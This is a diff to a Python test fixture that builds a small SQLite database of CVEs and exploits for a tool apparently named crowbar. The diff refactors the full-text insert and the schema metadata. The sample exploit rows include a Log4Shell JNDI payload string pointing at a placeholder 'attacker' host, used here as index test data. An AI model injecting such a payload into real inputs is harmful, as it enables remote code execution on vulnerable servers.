@@ -59,7 +59,7 @@ def run_cb_json(*args: str, home: str | None = None):
 
 def make_fixture_db(path: pathlib.Path) -> pathlib.Path:
     """Small but complete DB: every table + every FTS index has rows."""
-    from crowbar import indexer
+    from crowbar import indexer, intel, paths
 
     if path.exists():
         path.unlink()
@@ -185,8 +185,7 @@ def make_fixture_db(path: pathlib.Path) -> pathlib.Path:
          "import requests\npayload = '${jndi:ldap://attacker/x}'\nrequests.get(url)"),
         ("1", "exploits/windows/smb/1.py",
          "socket connect 445 smb shellcode buffer overflow")])
-    con.executemany("INSERT INTO cve_fts(id,description,products) VALUES (?,?,?)",
-                    [(c[0], c[4], " ".join(c[0].split("-"))) for c in cves])
+    con.executemany(intel.FTS_INSERT, [(c[0], c[4], " ".join(c[0].split("-"))) for c in cves])
     con.executemany("INSERT INTO exploit_fts(id,description,tags,codes) VALUES (?,?,?,?)", [
         ("50592", "Apache Log4j 2 Remote Code Execution RCE", "log4j,rce", "CVE-2021-44228"),
         ("1", "SMB remote exploit", "smb", "CVE-2017-0144")])
@@ -222,7 +221,8 @@ def make_fixture_db(path: pathlib.Path) -> pathlib.Path:
          ago(1), None),
         ("hn", "CVE-2017-0144", "https://news.ycombinator.com/item?id=2", "EternalBlue", ago(40), 300)])
     con.executemany("INSERT INTO meta VALUES (?,?)", [
-        ("schema", "3"), ("built_at", "2026-01-01T00:00:00Z"),
+        ("schema", str(paths.SCHEMA_VERSION)), ("fts_rowid", "1"),
+        ("built_at", "2026-01-01T00:00:00Z"),
         ("updated_at", "2026-01-01T00:00:00Z")])
     con.commit()
     con.executescript(indexer.INDEXES)
